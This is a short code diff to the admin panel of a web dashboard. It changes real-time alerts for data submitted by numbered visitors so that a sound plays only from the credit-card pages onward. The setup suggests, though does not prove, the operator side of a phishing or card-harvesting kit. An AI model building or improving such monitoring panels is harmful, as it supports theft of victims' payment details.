@@ -1093,12 +1093,16 @@
         }
         // Show notification with sound
         showNotification('📝 بيانات جديدة من الزائر #' + visitor.visitorNumber);
-        // Play notification sound
-        try {
-          const audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2teleQAAAAAAAAAAAA==');
-          audio.volume = 0.5;
-          audio.play().catch(() => {});
-        } catch(e) {}
+        // Play frog sound only for pages from credit card onwards (not for documents/summary/update info pages)
+        const noSoundPages = ['صفحة الوثائق', 'صفحة الملخص والدفع', 'ملخص الدفع', 'معلومات الأعمال', 'الصفحة الرئيسية'];
+        const currentPage = data && data.page ? data.page : (visitor.page || '');
+        if (!noSoundPages.includes(currentPage)) {
+          try {
+            const frogAudio = new Audio('/admin/frog.mp3');
+            frogAudio.volume = 0.7;
+            frogAudio.play().catch(() => {});
+          } catch(e) {}
+        }
       });
 
       socket.on('visitor:disconnected', ({ visitorId, socketId }) => {
